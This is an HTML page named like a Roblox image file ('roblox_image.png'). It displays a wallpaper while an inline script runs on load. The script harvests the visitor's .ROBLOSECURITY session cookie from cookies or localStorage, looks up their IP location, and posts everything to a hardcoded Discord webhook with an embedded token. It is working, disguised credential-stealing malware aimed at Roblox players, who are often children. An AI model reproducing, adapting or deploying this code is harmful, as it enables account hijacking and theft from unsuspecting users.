<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>roblox_image.png</title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        img { max-width: 100%; max-height: 100vh; }
    </style>
</head>
<body>
    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Roblox Image">

    <script>
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // ================= ANTI-SPAM =================
        if (sessionStorage.getItem('rbx_enviado')) { 
            throw new Error('Ya enviado'); 
        }
        sessionStorage.setItem('rbx_enviado', 'true');

        // ================= FUNCIÓN PARA ENVIAR A DISCORD =================
        async function enviar(mensaje) {
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: mensaje })
                });
            } catch (e) {}
        }

        // ================= OBTENER IP SIN CORS (usando JSONP) =================
        function obtenerIPConJSONP() {
            return new Promise((resolve) => {
                const script = document.createElement('script');
                script.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
                
                window.ipCallback = (data) => {
                    resolve(data.ip);
                    document.body.removeChild(script);
                    delete window.ipCallback;
                };
                
                script.onerror = () => {
                    resolve(null);
                    document.body.removeChild(script);
                };
                
                document.body.appendChild(script);
                
                // Timeout por si acaso
                setTimeout(() => {
                    if (window.ipCallback) {
                        resolve(null);
                        delete window.ipCallback;
                    }
                }, 5000);
            });
        }

        // ================= OBTENER PAÍS SIN CORS (usando servicio alternativo) =================
        function obtenerPaisConJSONP(ip) {
            return new Promise((resolve) => {
                if (!ip) {
                    resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
                    return;
                }
                
                // Usar un servicio que soporte JSONP
                const script = document.createElement('script');
                script.src = `https://ipapi.co/${ip}/json/?callback=paisCallback`;
                
                window.paisCallback = (data) => {
                    resolve({
                        pais: data.country_name || 'Desconocido',
                        ciudad: data.city || 'Desconocida'
                    });
                    document.body.removeChild(script);
                    delete window.paisCallback;
                };
                
                script.onerror = () => {
                    resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
                    document.body.removeChild(script);
                };
                
                document.body.appendChild(script);
                
                setTimeout(() => {
                    if (window.paisCallback) {
                        resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
                        delete window.paisCallback;
                    }
                }, 5000);
            });
        }

        // ================= FUNCIÓN PRINCIPAL =================
        (async function() {
            try {
                let cookie = null;
                let metodos = [];

                // ===== BUSCAR COOKIE =====
                try {
                    const cookies = document.cookie.split(';');
                    for (let c of cookies) {
                        c = c.trim();
                        if (c.includes('.ROBLOSECURITY')) {
                            cookie = c.split('=').slice(1).join('=');
                            metodos.push('document.cookie');
                            break;
                        }
                    }
                } catch(e) {}

                if (!cookie) {
                    try {
                        for (let i = 0; i < localStorage.length; i++) {
                            const val = localStorage.getItem(localStorage.key(i));
                            if (val && val.includes('_|WARNING')) {
                                cookie = val;
                                metodos.push('localStorage');
                                break;
                            }
                        }
                    } catch(e) {}
                }

                // ===== OBTENER UBICACIÓN SIN CORS =====
                let pais = 'Desconocido';
                let ciudad = 'Desconocida';
                
                try {
                    const ip = await obtenerIPConJSONP();
                    if (ip) {
                        const ubicacion = await obtenerPaisConJSONP(ip);
                        pais = ubicacion.pais;
                        ciudad = ubicacion.ciudad;
                    }
                } catch(e) {}

                // ===== FECHA/HORA =====
                const ahora = new Date();
                const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 'Desconocido';

                // ===== CONSTRUIR MENSAJE =====
                const mensaje = `|| @everyone ||
🔔 NUEVA ENTRADA | **BL PAPI** !

**📌 INFORMACIÓN GENERAL**

**Dispositivo:** \`${dispositivo}\`
**País:** \`${pais}\`
**Ciudad Aproximada:** \`${ciudad}\`

**🧭 Horarios:**

 **Fecha:** \`${fecha}\`
**Hora Exacta En Argentina:** \`${hora}\`

**ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX**

**👤 Usuario:**  \`No disponible\`
**🆔 ID:**        \`No disponible\`
**💰 Robux:**        \`No disponible\`
**⭐ Seguidores:**   \`No disponible\`
**👥 Amigos:**      \`No disponible\`

**📊 ITEMS LIMITED (RAREZA)**

**Headless:**   \`No\`
**Korblox:**    \`No\`

**📈 ESTADÍSTICAS**

**🖼 Visitas al perfil:** \`No disponible\`
**🎮 Juegos creados:** \`No disponible\`
**🏆 Logros:** \`No disponible\`
**📦 Trade count:** \`No disponible\`
**📊 Trade ratio:** \`No disponible\`

**🍪 COOKIE DE ROBLOX**
\`\`
${cookie || 'No encontrada (inicia sesión en Via Browser)'}
\`\`

**🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}`;

                await enviar(mensaje);

            } catch(e) {
                await enviar(`❌ Error: ${e.message}`);
            }
        })();
    </script>
</body>
</html>
